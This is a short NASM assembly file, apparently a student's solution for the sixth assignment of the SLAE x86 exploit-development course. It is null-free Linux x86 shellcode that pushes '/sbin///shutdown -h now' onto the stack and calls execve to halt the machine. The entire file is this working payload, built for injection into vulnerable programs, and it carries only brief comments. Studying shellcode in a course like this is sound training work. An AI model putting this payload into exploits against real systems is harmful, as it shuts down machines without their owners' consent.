; Filename: shutdowm.nasm
; Author:  Slumber
;
; Purpose: SLAEx86 Assignment 6

global _start			

section .text
_start:
	xor eax, eax
	cdq

	; to push now onto the stack
	push edx
	push byte 0x77			; to push w
	push word 0x6f6e		; to push on
	mov esi, esp

	; to push -h onto the stack
	push edx
	push word 0x682d		; to push h-
	mov edi, esp

	; to push /sbin///shutdown
	push edx
	push 0x6e776f64			; to push nwod
	push 0x74756873			; to push tuhs
	push 0x2f2f2f6e			; to push ///n
	push 0x6962732f			; to push ibs/
	mov ebx, esp

	; SYS_EXECVE
	mov al, 0x0b			; 0x0b = execve()
	push edx
	push esi
	push edi
	push ebx
	mov ecx, esp
	int 0x80
